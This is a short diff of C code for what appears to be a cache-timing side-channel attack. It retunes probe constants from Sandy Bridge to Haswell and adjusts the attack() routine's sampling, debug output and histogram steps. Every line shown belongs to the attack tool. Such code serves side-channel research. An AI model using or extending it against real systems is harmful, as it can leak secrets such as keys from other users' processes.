@@ -4,9 +4,10 @@
  // Sandy Bridge (sandy)
 static const char mask[] = ".....@@@@@@.....";
 #define ALLOWEDMISSES 2
-#define GAPLEN 200 
+//#define GAPLEN 200  /*used for sandybridge, 32 bit */
 #define SPLIT 15
 
+#define GAPLEN 16  /*used for haswell4, 64 bit */
 #define RECORDLEN 100000
 #define SLOT 5000
 
@@ -207,7 +208,7 @@ static void sample(pp_t pp, char *record, int samplecount) {
     p = rdtscp();
   }
   /*return a string represnet the number of samples for that probe*/
-  //record[samplecount] = '\0';
+  record[samplecount] = '\0';
 }
 
 
@@ -231,17 +232,27 @@ static void attack(cachemap_t cm) {
           /*matches at the cache set with offset, probing record....*/
 	printf("Match at %d[0x%03x]: %.150s\n", i, offset, record);
 	sample(pps[i], record, RECORDLEN);
+
 	if (matchcount(record, mask, ALLOWEDMISSES) < SEARCHLEN*2/strlen(mask)/3) {
 	  printf("False positive\n");
 	  continue;
 	}
+
 	cleanup(record);
+	printf("after cleannng up: %.150s\n", record);
+	
 	char *start = findstart(record);
+        /*start cannot be a NULL pointer*/
+        assert(start); 
+
 	findend(start);
+
 	int hist[100];
 	histogram(start, hist, 100);
+
 	int low = 0;
 	int high = 0;
+
 	for (int i = 0; i < SPLIT; i++) 
 	  low += hist[i];
 	for (int i = SPLIT; i < 100; i++) 
